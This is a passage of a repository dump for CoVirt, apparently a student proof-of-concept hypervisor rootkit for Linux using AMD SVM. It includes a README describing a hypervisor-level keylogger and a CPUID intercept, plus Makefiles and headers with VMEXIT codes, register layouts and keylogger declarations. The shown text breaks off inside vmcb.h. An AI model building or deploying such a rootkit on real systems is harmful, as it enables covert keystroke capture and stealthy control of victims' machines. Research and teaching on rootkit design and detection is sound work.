@@ -1,0 +1,2901 @@
+Project Path: arc_gmh5225_covirt_x9t21f1p
+
+Source Tree:
+
+```txt
+arc_gmh5225_covirt_x9t21f1p
+├── CoVirt Setup Diagram.png
+├── README.md
+├── covirt
+│   ├── BackupMakefile
+│   ├── Makefile
+│   ├── include
+│   │   ├── apic.h
+│   │   ├── exit_handle.h
+│   │   ├── io.h
+│   │   ├── keylogger.h
+│   │   ├── reg_utils.h
+│   │   ├── svm_utils.h
+│   │   └── vmcb.h
+│   ├── src
+│   │   ├── apic.c
+│   │   ├── covirt_module.c
+│   │   ├── exit_handle.c
+│   │   ├── io.c
+│   │   ├── keylogger.c
+│   │   ├── low_level.S
+│   │   ├── reg_utils.c
+│   │   ├── svm_utils.c
+│   │   ├── unit_tester.c
+│   │   └── vmcb.c
+│   ├── test.sh
+│   ├── turn_off_logging.sh
+│   └── unit_tester
+├── debugging-notes.txt
+├── setup_playground.sh
+└── testing_playground
+    └── init-temp
+
+```
+
+`README.md`:
+
+```md
+# CoVirt (a virtual-machine based rootkit)
+
+## A toy virtual-machine based rootkit designed for Linux Kernel v5.13.0 using AMD-V (SVM).
+
+## Table of Contents
+
+1. [Introduction](#introduction)
+2. [Malicious Service Demos](#malicious-service-demos)
+3. [How to run/test it out](#test-it-out)
+4. [General Design Diagram (this is pretty sick, go look at it)](#general-design)
+5. [References](#references)
+
+## Introduction
+
+A hypervisor (virtual machine monitor/VMM) sits logically below a guest operating system (virtual machine/VM), managing access to and emulating certain pieces of hardware for said guest. Ideally, this guest OS would operate no differently than it would directly on top of real hardware, making it unaware of its virtualized state. Due to this privileged position and inherent difficulty of detection, hypervisors present an interesting platform upon which to build malicious services.
+
+![image](https://user-images.githubusercontent.com/52044930/173881044-d1fa2e0e-088a-4144-8f80-a54e955c6e4c.png)
+
+CoVirt (our virtual-machine based rootkit) can be simply thought of as "lifting" the rest of the kernel up, and "sliding underneath" to dynamically virtualize it. It basically asserts itself as the hypervisor for the running operating system and forces the rest of the kernel to run on top of it. Currently, once it establishes itself as the hypervisor, CoVirt is able to perform a couple "malicious" services (just basic proof-of-concepts). 
+
+## "Malicious" service demos
+**The maliciously implemented services are operating at the hypervisor-level (NOT kernel-level).**
+
+* Keylogger (just set it to output the buffer at 100 bytes, but adding data exfiltration over a network is very possible)
+
+https://user-images.githubusercontent.com/52044930/173870279-a584f691-bc97-42dc-b649-1dd83c478b8a.mp4
+
+* CPUID Instruction intercept (just did it for function number 0x0)
+
+https://user-images.githubusercontent.com/52044930/173870229-c773d6e6-6d13-47c7-bc31-063a0e91abd9.mp4
+
+
+## Test it out
+Our testing environment is just a QEMU/KVM + BusyBox box. 
+
+WARNING: This is going to build a 5.13.0 Linux kernel. If you want to just use your current linux kernel instead of building a new one, you'll need set the KERNEL_ROOT variable to point to the root of your kernel source tree thing. I will maybe add support to streamline this, as it would be rather quick to do, but I'm lazy and no one's actually going to look at this. 
+
+You'll need QEMU ofc, so go install that first.
+
+1. Build Linux Kernel, setup initrd w/ BusyBox
+
+I made this script to automate most of the process. It'll basically just compile BusyBox and a 5.13 kernel for you. Kinda important to make sure your directory setup is the same as mine, as the "test.sh" script relies on that if that's how you'll want to run.
+```
+./setup_playground.sh
+```
+
+IMPORTANT CONFIG:
+
+BusyBox: 
+* "Build static binary" to [Y]
+
+Linux Kernel (only needed if you want to debug/develop, although the init binary used for BusyBox might depend on these... I'm way too lazy to check).
+* DYNAMIC_DEBUG to [Y]es
+* DYNAMIC_DEBUG_CORE to [Y]es
+* GDB_SCRIPTS to [Y]es
+
+
+2. Now, to test the "covirt_module.ko".
+```
+cd covirt
+sudo ./test.sh  // sudo required for KVM (I believe... I promise it's nothing malicious, but check it out yourself if you really care.)
+```
+
+This will bring up the QEMU/KVM system
+
+
+3. To run the module:
+```
+insmod ./covirt_module.ko
+```
+
+
+4. Modify the Makefile in covirt/ to alter the options/malicious services you're interested in.
+```
+...
+DEBUG_ENABLED = 1
+KEYLOGGER = 0
+FAKE_CPUID = 1
+...
+```
+
+Note: Messing with the QEMU launch script will probably break stuff
+
+
+## General Design
+
+Outline for our basic SVM-based hypervisor/vmm implementation (used https://app.diagrams.net to make it :D):
+
+![Alt text](./CoVirt%20Setup%20Diagram.png?raw=true "CoVirt Setup Diagram")
+
+It's not the best outline, but it gets the point across (I hope) and it was made as a guide for development.
+
+## References:
+- https://www.amd.com/system/files/TechDocs/24593.pdf
+- https://www.amd.com/system/files/TechDocs/24594.pdf
+- https://github.com/PeterDinda/palacios
+- https://www.microsoft.com/en-us/research/wp-content/uploads/2016/02/subvirt.pdf
+- "Blue Pill" by Joanna Rutkowska
+- https://nixhacker.com/developing-hypervisior-from-scratch-part-1/
+
+```
+
+`covirt/BackupMakefile`:
+
+```
+obj-m += covirt_module.o
+covirt_module-objs += src/covirt_module.o src/reg_utils.o src/svm.o src/svm_utils.o src/vmcb.o src/low_level.o
+
+all:
+	make -C /lib/modules/$(shell uname -r)/build/ M=$(PWD) modules
+clean:
+	make -C /lib/modules/$(shell uname -r)/build/ M=$(PWD) clean
+
+```
+
+`covirt/Makefile`:
+
+```
+obj-m += covirt_module.o
+covirt_module-objs += src/covirt_module.o src/reg_utils.o src/svm_utils.o src/vmcb.o src/low_level.o src/apic.o src/exit_handle.o src/io.o src/keylogger.o
+EXTRA_CFLAGS=-I$(PWD)/include
+
+DEBUG_ENABLED = 1
+KEYLOGGER = 0
+FAKE_CPUID = 1
+
+ifeq ($(DEBUG_ENABLED), 1)
+	EXTRA_CFLAGS += -DDEBUG_ENABLED
+endif
+
+ifeq ($(KEYLOGGER), 1)
+	EXTRA_CFLAGS += -DKEYLOGGER
+endif
+
+ifeq ($(FAKE_CPUID), 1)
+	EXTRA_CFLAGS += -DFAKE_CPUID
+endif
+
+ifndef KERNEL_ROOT
+	KERNEL_ROOT=../testing_playground/obj/linux-basic/
+endif
+
+all:
+	make -C $(KERNEL_ROOT) M=$(PWD) modules
+	
+clean:
+	make -C $(KERNEL_ROOT) M=$(PWD) clean
+
+```
+
+`covirt/include/apic.h`:
+
+```h
+#include <linux/kernel.h>
+
+void print_apic_info(void);
+
+//// This is for xAPIC
+
+// Apic Base Address Register
+struct apic_ba_reg {
+	uint64_t base_addr;
+	uint8_t bsc; // Is this the boot strap core
+	uint8_t enabled; // Is APIC enabled
+	uint8_t x2apic;
+} __attribute__((packed));
+
+struct apic_ba_reg get_apic_info(void);
+
+uint64_t get_current_isrs(void);
+uint64_t get_current_irrs(void);
+void setup_apic_mapping(void);
+uint16_t is_timer_interrupt(void);
+
+
+//// This is for x2APIC
+
+
+```
+
+`covirt/include/exit_handle.h`:
+
+```h
+//define exit_code to find handler
+//see volume 2 appendix c
+//Damn, I don't trust myself for this long table. Check it again tonight.
+#define VMEXIT_CR0_READ			    0x0
+#define VMEXIT_CR1_READ			    0x1
+#define VMEXIT_CR2_READ			    0x2
+#define VMEXIT_CR3_READ			    0x3
+#define VMEXIT_CR4_READ			    0x4
+#define VMEXIT_CR5_READ			    0x5
+#define VMEXIT_CR6_READ			    0x6
+#define VMEXIT_CR7_READ			    0x7
+#define VMEXIT_CR8_READ			    0x8
+#define VMEXIT_CR9_READ			    0x9
+#define VMEXIT_CR10_READ		    0xA
+#define VMEXIT_CR11_READ		    0xB
+#define VMEXIT_CR12_READ		    0xC
+#define VMEXIT_CR13_READ		    0xD
+#define VMEXIT_CR14_READ		    0xE
+#define VMEXIT_CR15_READ		    0xF
+#define VMEXIT_CR0_WRITE		    0x10
+#define VMEXIT_CR1_WRITE		    0x11
+#define VMEXIT_CR2_WRITE		    0x12
+#define VMEXIT_CR3_WRITE		    0x13
+#define VMEXIT_CR4_WRITE		    0x14
+#define VMEXIT_CR5_WRITE		    0x15
+#define VMEXIT_CR6_WRITE		    0x16
+#define VMEXIT_CR7_WRITE		    0x17
+#define VMEXIT_CR8_WRITE		    0x18
+#define VMEXIT_CR9_WRITE		    0x19
+#define VMEXIT_CR10_WRITE		    0x1A
+#define VMEXIT_CR11_WRITE		    0x1B
+#define VMEXIT_CR12_WRITE		    0x1C
+#define VMEXIT_CR13_WRITE		    0x1D
+#define VMEXIT_CR14_WRITE		    0x1E
+#define VMEXIT_CR15_WRITE		    0x1F
+#define VMEXIT_DR0_READ			    0x20
+#define VMEXIT_DR1_READ			    0x21
+#define VMEXIT_DR2_READ			    0x22
+#define VMEXIT_DR3_READ			    0x23
+#define VMEXIT_DR4_READ			    0x24
+#define VMEXIT_DR5_READ			    0x25
+#define VMEXIT_DR6_READ			    0x26
+#define VMEXIT_DR7_READ			    0x27
+#define VMEXIT_DR8_READ			    0x28
+#define VMEXIT_DR9_READ			    0x29
+#define VMEXIT_DR10_READ		    0x2A
+#define VMEXIT_DR11_READ		    0x2B
+#define VMEXIT_DR12_READ		    0x2C
+#define VMEXIT_DR13_READ		    0x2D
+#define VMEXIT_DR14_READ		    0x2E
+#define VMEXIT_DR15_READ		    0x2F
+#define VMEXIT_DR0_WRITE		    0x30
+#define VMEXIT_DR1_WRITE		    0x31
+#define VMEXIT_DR2_WRITE		    0x32
+#define VMEXIT_DR3_WRITE		    0x33
+#define VMEXIT_DR4_WRITE		    0x34
+#define VMEXIT_DR5_WRITE		    0x35
+#define VMEXIT_DR6_WRITE		    0x36
+#define VMEXIT_DR7_WRITE		    0x37
+#define VMEXIT_DR8_WRITE		    0x38
+#define VMEXIT_DR9_WRITE		    0x39
+#define VMEXIT_DR10_WRITE		    0x3A
+#define VMEXIT_DR11_WRITE		    0x3B
+#define VMEXIT_DR12_WRITE		    0x3C
+#define VMEXIT_DR13_WRITE		    0x3D
+#define VMEXIT_DR14_WRITE		    0x3E
+#define VMEXIT_DR15_WRITE		    0x3F
+#define VMEXIT_EXCP0			    0x40
+#define VMEXIT_EXCP1			    0x41
+#define VMEXIT_EXCP2				0x42
+#define VMEXIT_EXCP3				0x43
+#define VMEXIT_EXCP4				0x44
+#define VMEXIT_EXCP5				0x45
+#define VMEXIT_EXCP6				0x46
+#define VMEXIT_EXCP7				0x47
+#define VMEXIT_EXCP8				0x48
+#define VMEXIT_EXCP9				0x49
+#define VMEXIT_EXCP10				0x4A
+#define VMEXIT_EXCP11				0x4B
+#define VMEXIT_EXCP12				0x4C
+#define VMEXIT_EXCP13				0x4D
+#define VMEXIT_EXCP14				0x4E
+#define VMEXIT_EXCP15				0x4F
+#define VMEXIT_EXCP16				0x50
+#define VMEXIT_EXCP17				0x51
+#define VMEXIT_EXCP18				0x52
+#define VMEXIT_EXCP19				0x53
+#define VMEXIT_EXCP20				0x54
+#define VMEXIT_EXCP21				0x55
+#define VMEXIT_EXCP22				0x56
+#define VMEXIT_EXCP23				0x57
+#define VMEXIT_EXCP24				0x58
+#define VMEXIT_EXCP25				0x59
+#define VMEXIT_EXCP26				0x5A
+#define VMEXIT_EXCP27				0x5B
+#define VMEXIT_EXCP28				0x5C
+#define VMEXIT_EXCP29				0x5D
+#define VMEXIT_EXCP30				0x5E
+#define VMEXIT_EXCP31				0x5F
+#define VMEXIT_INTR					0x60
+#define VMEXIT_NMI					0x61
+#define VMEXIT_SMI					0x62
+#define VMEXIT_INIT					0x63
+#define VMEXIT_VINTR				0x64
+#define VMEXIT_CR0_SEL_WRITE		0x65
+#define VMEXIT_IDTR_READ			0x66
+#define VMEXIT_GDTR_READ			0x67
+#define VMEXIT_LDTR_READ			0x68
+#define VMEXIT_TR_READ				0x69
+#define VMEXIT_IDTR_WRITE			0x6A
+#define VMEXIT_GDTR_WRITE			0x6B
+#define VMEXIT_LDTR_WRITE			0x6C
+#define VMEXIT_TR_WRITE				0x6D
+#define VMEXIT_RDTSC				0x6E
+#define VMEXIT_RDPMC				0x6F
+#define VMEXIT_PUSHF				0x70
+#define VMEXIT_POPF					0x71
+#define VMEXIT_CPUID				0x72
+#define VMEXIT_RSM					0x73
+#define VMEXIT_IRET					0x74
+#define VMEXIT_SWINT				0x75
+#define VMEXIT_INVD					0x76
+#define VMEXIT_PAUSE				0x77
+#define VMEXIT_HLT					0x78
+#define VMEXIT_INVLPG				0x79
+#define VMEXIT_INVLPGA				0x7A
+#define VMEXIT_IOIO					0x7B
+#define VMEXIT_MSR					0x7C
+#define VMEXIT_TASK_SWITCH			0x7D
+#define VMEXIT_FERR_FREEZE			0x7E
+#define VMEXIT_SHUTDOWN				0x7F
+#define VMEXIT_VMRUN				0x80
+#define VMEXIT_VMMCALL				0x81
+#define VMEXIT_VMLOAD				0x82
+#define VMEXIT_VMSAVE				0x83
+#define VMEXIT_STGI					0x84
+#define VMEXIT_CLGI					0x85
+#define VMEXIT_SKINIT				0x86
+#define VMEXIT_RDTSCP				0x87
+#define VMEXIT_ICEBP				0x88
+#define VMEXIT_WBINVD				0x89
+#define VMEXIT_MONITOR				0x8A
+#define VMEXIT_MWAIT				0x8B
+#define VMEXIT_MWAIT_CONDITIONAL	0x8C
+#define VMEXIT_RDPRU	            0x8E    //don't know why E is in front of D in the manual
+#define VMEXIT_XSETBV	            0x8D
+#define VMEXIT_EFER_WRITE_TRAP	    0x8F
+#define VMEXIT_CR0_WRITE_TRAP	    0x90
+#define VMEXIT_CR1_WRITE_TRAP	    0x91
+#define VMEXIT_CR2_WRITE_TRAP	    0x92
+#define VMEXIT_CR3_WRITE_TRAP	    0x93
+#define VMEXIT_CR4_WRITE_TRAP	    0x94
+#define VMEXIT_CR5_WRITE_TRAP	    0x95
+#define VMEXIT_CR6_WRITE_TRAP	    0x96
+#define VMEXIT_CR7_WRITE_TRAP	    0x97
+#define VMEXIT_CR8_WRITE_TRAP	    0x98
+#define VMEXIT_CR9_WRITE_TRAP	    0x99
+#define VMEXIT_CR10_WRITE_TRAP	    0x9A
+#define VMEXIT_CR11_WRITE_TRAP	    0x9B
+#define VMEXIT_CR12_WRITE_TRAP	    0x9C
+#define VMEXIT_CR13_WRITE_TRAP	    0x9D
+#define VMEXIT_CR14_WRITE_TRAP	    0x9E
+#define VMEXIT_CR15_WRITE_TRAP	    0x9F
+#define VMEXIT_INVLPGB              0xA0
+#define VMEXIT_INVLPGB_ILLEGAL      0xA1
+#define VMEXIT_INVPCID              0xA2
+#define VMEXIT_MCOMMIT              0xA3
+#define VMEXIT_TLBSYNC              0xA4
+#define VMEXIT_NPF					0x400
+#define AVIC_INCOMPLETE_IPI         0x401
+#define AVIC_NOACCEL                0x402
+#define VMEXIT_VMGEXIT              0x403
+#define VMEXIT_INVALID				-1
+#define VMEXIT_BUSY				    -2
+
+
+void handle_vmexit(void);
+
+void handle_phys_int(void);
+
+void handle_ioio(void);
+
+void handle_cpuid(void);
+```
+
+`covirt/include/io.h`:
+
+```h
+void * setup_iopm(void);
+```
+
+`covirt/include/keylogger.h`:
+
+```h
+
+// This just stores a char into the global keylogger buffer
+// Clears and outputs buffer when it gets too full
+void keylog_char(char c);
+
+// Clears the global keylogger buffer
+void clear_keylogger_buf(void);
+
+// Output the keylogger buffer
+void output_keylogger_buf(void);
+```
+
+`covirt/include/reg_utils.h`:
+
+```h
+// Load contents of 64-bit MSR specified by ECX register into registers EDX:EAX
+// High order bits go to EDX, Low order bits go to EAX
+#define UPPER_4 0xFFFFFFFF00000000
+#define LOWER_4 0x00000000FFFFFFFF
+#define EFER_MSR 0xC0000080 // Address of EFER MSR
+#define VM_HSAVE_PA_MSR	0xC0010117 // The PA of host state save goes here
+#define SVM_FF 1 << 2 // SVM Feature Flag
+#define SVML_FF 1 << 2 // SVML Feature Flag
+#define VM_CR 0xC0010114  // VM_CR MSR
+#define VMCR_SVMDIS 1 << 4  // SVMDIS bit in VM_CR MSR
+#define VMCR_Lock 1 << 3  // Lock bit in VM_CR MSR
+#define _SVME 1 << 12  // EFER.SVME Bit
+
+// SYSCALL and SYSRET MSRs
+#define STAR_MSR    0xC0000081
+#define LSTAR_MSR   0xC0000082
+#define CSTAR_MSR   0xC0000083
+#define SFMASK_MSR  0xC0000084
+
+// SYSENTER and SYSEXIT (Legacy Mode Only)
+#define SYSENTER_CS_MSR     0x174
+#define SYSENTER_ESP_MSR    0x175
+#define SYSENTER_EIP_MSR    0x176
+
+// Used for SWAPGS
+#define KernelGSBase_MSR    0xC0000102
+
+// Should probably use Linux's desc_ptr but idk who cares
+typedef struct descriptor_ptr {
+    uint16_t limit;
+    uint64_t base;
+} __attribute__((packed)) desc_ptr;
+
+typedef struct __128bit {
+    uint64_t low;
+    uint64_t high;
+} __attribute__((packed)) __128bit_t;
+
+typedef struct sys_desc {
+    uint16_t selector;
+    uint16_t attributes;
+    uint32_t limit;
+    uint64_t base;
+} __attribute__((packed)) sys_desc_t;
+
+// RFLAGS register, maybe put here?Not sure
+typedef struct rflags_reg {
+    uint64_t CF        : 1; //[0] carry flag
+    uint64_t rsvd0     : 1; //[1] reserved 
+    uint64_t PF        : 1; //[2] Parity Flag
+    uint64_t rsvd1     : 1; //[3] reserved
+    uint64_t AF        : 1; //[4] Auxiliary Flag
+    uint64_t rsvd2     : 1; //[5] reserved
+    uint64_t ZF        : 1; //[6] Zero Flag
+    uint64_t SF        : 1; //[7] Sign Flag
+    uint64_t TF        : 1; //[8] Trap Flag
+    uint64_t IF        : 1; //[9] Interrupt Flag
+    uint64_t DF        : 1; //[10] Direction Flag
+    uint64_t OF        : 1; //[11] Overflow Flag
+    uint64_t IOPL      : 2; //[12-13] I/O Privilege Level
+    uint64_t NT        : 1; //[14] Nested Task
+    uint64_t rsvd3     : 1; //[15] reserved
+    uint64_t RF        : 1; //[16] Resume Flag
+    uint64_t VM        : 1; //[17] Virtual-8086 Mode
+    uint64_t AC        : 1; //[18] Alignment Check
+    uint64_t VIF       : 1; //[19] Virtual Interrupt Flag
+    uint64_t VIP       : 1; //[20] Virtual Interrupt Pending
+    uint64_t ID        : 1; //[21] ID Flag
+    uint64_t rsvd4     : 42;  //[22-63] reserved
+} __attribute__((packed)) rflags_reg_t;
+
+
+// EFER register, maybe put here?Not sure
+typedef union efer_reg {
+    uint64_t val;
+    struct {
+        uint64_t SCE       : 1; //[0] System Call Extensions
+        uint64_t rsvd0     : 7; //[1-7] reserved 
+        uint64_t LME       : 1; //[8] Long Mode Enable
+        uint64_t rsvd1     : 1; //[9] reserved
+        uint64_t LMA       : 1; //[10] Long Mode Active
+        uint64_t NXE       : 1; //[11] No-Execute Enable
+        uint64_t SVME      : 1; //[12] Secure Virtual Machine Enable
+        uint64_t LMSLE     : 1; //[13] Long Mode Segment Limit Enable
+        uint64_t FFXSR     : 1; //[14] Fast FXSAVE/FXRSTOR
+        uint64_t TCE       : 1; //[15] Translation Cache Extension
+        uint64_t rsvd2     : 1; //[16] reserved
+        uint64_t MCOMMIT   : 1; //[17] Enable MCOMMIT instruction 
+        uint64_t INTWB     : 1; //[18] Interruptible WBINVD/WBNOINVD enable
+        uint64_t rsvd3     : 1; //[19] reserved
+        uint64_t UAIE      : 1; //[20] Upper Address Ignore Enable
+        uint64_t rsvd4     : 43; //[21-63] reserved
+    } __attribute__((packed)); 
+} __attribute__((packed)) efer_reg_t;
+
+typedef union cr0_reg {
+    uint64_t val;
+    struct {
+        uint64_t PE     : 1;  // [0] Protection Enabled
+        uint64_t MP     : 1;  // [1] Monitor Coprocessor
+        uint64_t EM     : 1;  // [2] Emulation
+        uint64_t TS     : 1;  // [3] Task Switched
+        uint64_t ET     : 1;  // [4] Extension Type
+        uint64_t NE     : 1;  // [5] Numeric Error
+        uint64_t rsvd0  : 10; // [6:15] rsvd, do not change
+        uint64_t WP     : 1;  // [16] Write Protect
+        uint64_t rsvd1  : 1;  // [17] reserved, do not change
+        uint64_t AM     : 1;  // [18] alignment mask
+        uint64_t rsvd2  : 10; // [19:28] reserved, do not change
+        uint64_t NW     : 1;  // [29] Not writethrough
+        uint64_t CD     : 1;  // [30] Cache Disable
+        uint64_t PG     : 1;  // [31] Paging
+        uint64_t rsvd3  : 32; // [32:63]
+    } __attribute__((packed));
+} __attribute__((packed)) cr0_reg_t;
+
+// TODO: CR2 Register (AMD VOL 2, 3.1.2)
+/* 
+typedef struct cr2_reg {
+} __attribute__((packed)) cr2_reg_t;
+*/
+//CR2_reg are used for page-fault linear address, maybe don't need the struct for this.
+
+
+
+// TODO: CR3 Register (AMD VOL 2, 3.1.2)
+/* 
+typedef struct cr3_reg {
+} __attribute__((packed)) cr3_reg_t;
+*/
+//CR3 used for page table (this is in long mode)
+typedef union cr3_reg {
+    uint64_t val;
+    struct {
+        uint64_t rsvd0      : 3;  //[0-2] reserved
+        uint64_t PWT        : 1;  //[3] Page-Level Writethrough (PWT) Bit. see volume 2 P151
+        uint64_t PCD        : 1;  //[4] Page-Level Cache Disable (PCD) Bit.
+        uint64_t rsvd1      : 7;  //[5-11] reserved
+        uint64_t TBA0       : 20; //[12-31] 4-level table base address 
+        uint64_t TBA1       : 20; //[32-51] 4-level table base address
+        uint64_t rsvd2      : 12;  //[52-63] reserved and MBZ(must be zero)
+    } __attribute__((packed));
+} __attribute__((packed)) cr3_reg_t;
+
+
+
+
+
+
+// TODO: CR4 Register (AMD VOL 2, 3.1.2)
+/*
+typedef struct cr4_reg {
+} __attribute__((packed)) cr4_reg_t;
+*/
+//CR4 register
+typedef union cr4_reg {
+    uint64_t val;
+    struct {
+        uint64_t VME        : 1; //[0] Virtual-8086 Mode Extensions
+        uint64_t PVI        : 1; //[1] Protected-Mode Virtual Interrupts
+        uint64_t TSD        : 1; //[2] Time Stamp Disable
+        uint64_t DE         : 1; //[3] Debugging Extensions
+        uint64_t PSE        : 1; //[4] Page Size Extensions
+        uint64_t PAE        : 1; //[5] Physical-Address Extension
+        uint64_t MCE        : 1; //[6] Machine Check Enable
+        uint64_t PGE        : 1; //[7] Page-Global Enable
+        uint64_t PCE        : 1; //[8] Performance-Monitoring Counter Enable
+        uint64_t OSFXSR     : 1; //[9] Operating System FXSAVE/FXRSTOR Support
+        uint64_t OSXMMEXCPT : 1; //[10] Operating System Unmasked Exception Support
+        uint64_t UMIP       : 1; //[11] User Mode Instruction Prevention
+        uint64_t rsvd0      : 4; //[12-15] reserved, MBZ(must be zero)
+        uint64_t FSGSBASE   : 1; //[16] Enable RDFSBASE, RDGSBASE, WRFSBASE, and WRGSBASE instructions
+        uint64_t PCIDE      : 1; //[17] Process Context Identifier Enable
+        uint64_t OSXSAVE    : 1; //[18] XSAVE and Processor Extended States Enable Bit
+        uint64_t rsvd1      : 1; //[19] reserved
+        uint64_t SMEP       : 1; //[20] Supervisor Mode Execution Prevention
+        uint64_t SMAP       : 1; //[21] Supervisor Mode Access Protection
+        uint64_t PKE        : 1; //[22] Protection Key Enable
+        uint64_t CET        : 1; //[23] Control-flow Enforcement Technology
+        uint64_t rsvd2      : 40; //[24-63] reserved, MBZ
+    } __attribute__((packed));
+} __attribute__((packed)) cr4_reg_t;
+
+
+
+
+
+
+
+// TODO: CS (Code-Segment) Descriptors (AMD VOL 2, 4.8.1)
+
+//see volume 2 Page 76 
+//cs register has 16bit value which can be loaded to segement selector, this segement selector points to cs descriptor in the GDT(Global descriptor table)
+//for cs
+typedef union seg_sel {
+    uint16_t val;
+    struct {
+        uint16_t RPL    : 2;  //[0-1] Requestor Privilege Level
+        uint16_t TI     : 1;  //[2] Table Indicator TI=0 ->Global, TI=1 ->Local
+        uint16_t SI     : 13; //[3-15]  Selector Index
+    } __attribute__((packed));
+} __attribute__((packed)) seg_sel_t;
+
+// cs descripter has 2 doublwords(32 bits), and when in 64-bit long mode only D, L, P, DPL, C works
+typedef union cs_descriptor {
+    uint64_t val;
+    struct {
+        uint64_t SL0    : 16; //[0-15]first doubleword start. SegmentLimit[15:0] 
+        uint64_t BA0    : 16; //[16-31]first doubleword end. Base address[15:0]
+        uint64_t BA1    : 8;  //[0-7]second doubleword start. Base address[23:16]
+        uint64_t A      : 1;  //[8] access
+        uint64_t R      : 1;  //[9] Read
+        uint64_t C      : 1;  //[10] conform
+        uint64_t rsvd0  : 1;  //[11] for Type[8-11] must be 1
+        uint64_t rsvd1  : 1;  //[12] S bit must be 1 
+        uint64_t DPL    : 2;  //[13-14] Descriptor Privilege-Level (DPL) Field.
+        uint64_t P      : 1;  //[15] Present
+        uint64_t SL1    : 4;  //[16-19] SegmentLimit[19:16]
+        uint64_t AVL    : 1;  //[20] Available To Software (AVL) Bit.
+        uint64_t L      : 1;  //[21] Long (L) Attribute Bit 
+        uint64_t D      : 1;  //[22] Code-Segment Default-Operand Size (D) Bit
+        uint64_t G      : 1;  //[23] Granularity (G) Bit.
+        uint64_t BA2    : 8;  //[24-31]second doubleword end. Base address[31:24]
+    } __attribute__((packed));
+} __attribute__((packed)) cs_descriptor_t;
+
+
+
+// TODO: There are other system registers, but idk if we'll need them atm...
+
+
+uint64_t read_msr(uint32_t msr);
+void write_msr(uint32_t msr, uint32_t hi, uint32_t lo);
+
+uint64_t get_cr0(void);
+uint64_t get_cr2(void);
+uint64_t get_cr3(void);
+uint64_t get_cr4(void);
+
+desc_ptr get_idtr(void);
+desc_ptr get_gdtr(void);
+
+uint64_t get_descriptor(seg_sel_t seg_sel);
+
+uint16_t get_cs(void);
+uint16_t get_es(void);
+uint16_t get_ds(void);
+uint16_t get_ss(void);
+uint16_t get_fs(void);
+uint16_t get_gs(void);
+
+uint16_t get_ldtr(void);
+uint16_t get_tr(void);
+
+uint64_t get_dr6(void);
+uint64_t get_dr7(void);
+
+uint8_t get_vtpr(void);  // This is 8 bits, even though the V_TPR is 4 bits. This is because of the VMCB CA's stucture. 
+// uint8_t get_virq(void);  // This actually is only 1 bit
+
+
+```
+
+`covirt/include/svm_utils.h`:
+
+```h
+#include <linux/kernel.h>
+
+
+int svm_check(void);  // Check if SVM is available or a possibility
+int enable_svm(void);  // Turn on SVM (flip EFER.SVME to 1)
+
+void init_vm_hsave_pa(void);  // TODO: Move this somewhere else? O_O
+```
+
+`covirt/include/vmcb.h`:
+
+```h
+#include <linux/kernel.h>
+
+/* This file contains:
+  - The structures defining our VMCB
+  - Relevant types (although we may want to move this into a separate file)
+  - Declarations for VMCB-related functions (state save, setup, etc.)
+*/
+
+#define VMCB_SIZE 				0x1000 // 4K
+#define VMCB_CTRL_AREA_OFFSET	0x000
+#define VMCB_CTRL_AREA_SIZE 	0x400
+#define VMCB_SS_AREA_OFFSET		0x400
+#define VMCB_SS_AREA_SIZE		0x2E8
+
+typedef struct ctrl_reg {
+	int CR0 	: 1;
+	int CR1 	: 1;
+	int CR2 	: 1;
+	int CR3 	: 1;
+	int CR4 	: 1;
+	int CR5 	: 1;
+	int CR6 	: 1;
+	int CR7 	: 1;
+	int CR8		: 1;
+	int CR9 	: 1;
+	int CR10 	: 1;
+	int CR11 	: 1;
+	int CR12 	: 1;
+	int CR13 	: 1;
+	int CR14 	: 1;
+	int CR15 	: 1;
+} __attribute__((packed)) ctrl_reg_t;
+
+typedef struct debug_reg {
+	int DR0		: 1;
+	int DR1		: 1;
+	int DR2		: 1;
+	int DR3		: 1;
+	int DR4		: 1;
+	int DR5		: 1;
+	int DR6		: 1;
+	int DR7		: 1;
+	int DR8		: 1;
+	int DR9		: 1;
+	int DR10	: 1;
+	int DR11	: 1;
+	int DR12	: 1;
+	int DR13	: 1;
+	int DR14	: 1;
+	int DR15	: 1;
+} __attribute__((packed)) debug_reg_t; 
+
+typedef struct excp_vecs {
+	// AMD Volume 2 Section 8.2
+	// interrupt vector | name | cause
+	// "EX<NUM>" = reserved/undefined vector
+
+	int DE		: 1; // (0) Divide-by-Zero
+	int	DB 		: 1; // (1) Debug ; Instruction + data accesses
+	int NMI		: 1; // (2) External Non-maskable interrupt
+	int BP		: 1; // (3) Breakpoint ; INT3 instruction
+	int OF		: 1; // (4) Overflow ; INTO instruction
+	int BR		: 1; // (5) Bound-range ; BOUND instruction
+	int UD		: 1; // (6) Invalid opcode/instruction
+	int NM		: 1; // (7) Device not avail ; x87 instructions
+	int DF 		: 1; // (8) Double fault ; exception during handling of another fault
+	int EX9		: 1; // 
+	int TS		: 1; // (10) Invalid TSS ; task-state segment access + task switch
+	int NP 		: 1; // (11) Segment-Not-Present 
+	int SS 		: 1; // (12) Stack ; ss register loads and stack references
+	int GP		: 1; // (13) General-Protection ; mem accesses + protection checks
+	int PF		: 1; // (14) Page Fault ; mem accessses when paging enabled
+	int EX15	: 1;
+	int MF		: 1; // (16) x87 floating point exception pending ;
+	int AC		: 1; // (17) alignment check ; misaligned mem addr
+	int MC		: 1; // (18) machine check; model specific
+	int XF		: 1; // (19) SIMD Floating-point ; SSE floating-point instructions
+	int EX20	: 1;
+	int CP 		: 1; // (21) Control-Protection Exception ; RET/IRET or other control transfer
+	int EX22	: 1;
+	int EX23	: 1;
+	int EX24	: 1;
+	int EX25	: 1;
+	int EX26	: 1;
+	int EX27	: 1;
+	int HV		: 1; // (28) Hypervisor Injection ; Event injection 
+	int VC		: 1; // (29) VMM Communication Exception ; Virtualization Event
+	int SX		: 1; // (30) Security Exception ; Security-sensitive event in host 
+	int EX31	: 1;
+
+} __attribute__((packed)) excp_vecs_t;
+
+typedef struct instr_intercepts {
+	int INTR		: 1;  // physical maskable interrupt
+	int NMI			: 1;
+	int SMI			: 1;
+	int INIT		: 1;
+	int VINTR		: 1;  // virtual maskable interrupt
+	int CR0			: 1;  // intercept CR0 writes on bits other than CR0.TS or CR0.MP
+	int IDTR_RD		: 1;
+	int GDTR_RD 	: 1;
+	int LDTR_RD 	: 1;
+	int TR_RD 		: 1;
+	int IDTR_WR		: 1;
+	int GDTR_WR		: 1;
+	int LDTR_WR		: 1;
+	int TR_WR		: 1;
+	int RDTSC		: 1;
+	int RDPMC		: 1;
+	int PUSHF		: 1;
+	int POPF		: 1; 
+	int CPUID		: 1;
+	int RSM			: 1;
+	int IRET		: 1; 
+	int INTn		: 1;
+	int INVD		: 1;
